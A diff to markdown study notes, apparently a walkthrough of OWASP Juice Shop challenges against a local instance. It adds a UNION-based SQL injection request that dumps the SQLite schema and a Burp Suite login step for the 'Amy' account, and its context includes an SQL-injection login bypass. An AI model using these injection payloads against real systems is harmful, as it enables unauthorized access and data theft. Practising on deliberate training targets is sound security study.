@@ -144,6 +144,9 @@ submit form: <br>
 ```
 
 ### Database schema
+http://localhost:3000/#/search?q=<br>
+burp suite > proxy > repeater <br>
+GET /rest/products/search?q=apple'))union%20select%20sql,2,3,4,5,6,7,8,9%20from%20sqlite_master-- HTTP/1.1<br>
 
 ### Upload size
 
@@ -162,9 +165,13 @@ http://localhost:3000/#/login<br>
 email: bender@juice-sh.op'--<br>
 password: '<br>
 
+### Login Amy
+http://localhost:3000/#/login<br>
+burp suite > proxy<br>
+"email":"amy@juice-sh.op"<br>
+"password":"K1f....................."<br>
 
-
-
+### GDPR Data Erasure 
 
 
 
